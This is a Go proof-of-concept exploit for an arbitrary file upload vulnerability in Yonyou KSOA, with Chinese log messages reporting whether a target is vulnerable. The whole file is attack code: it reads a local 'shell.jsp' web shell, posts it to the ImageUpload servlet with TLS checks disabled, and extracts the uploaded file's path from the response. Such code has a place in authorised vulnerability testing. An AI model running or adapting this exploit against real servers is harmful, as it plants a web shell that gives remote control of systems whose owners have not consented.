package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func KSOA_ImageUpload(target string) {
	url := strings.TrimRight(target, "/")
	filePath := "shell.jsp"
	content, err := os.ReadFile(filePath)
	if err != nil {
		log.Fatal(err)
	}
	buf := bytes.NewBuffer(content)
	req, err := http.NewRequest("POST", url+"/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename="+filePath+"&_ZQA_ID=d0d60ec54924481c", buf)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------1227397960414991604")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	reg := regexp.MustCompile("<root>/pictures/")
	msg := reg.MatchString(string(respBody))
	if resp.StatusCode == http.StatusOK && msg {
		replacedStr := strings.ReplaceAll(string(respBody), "<root>", "")
		replacedStr = strings.ReplaceAll(replacedStr, "</root>", "")
		log.Println("[+] 存在用友KSOA任意文件上传漏洞：" + url + replacedStr)
	} else {
		log.Println("[-] 不存在用友KSOA任意文件上传漏洞")
	}

}
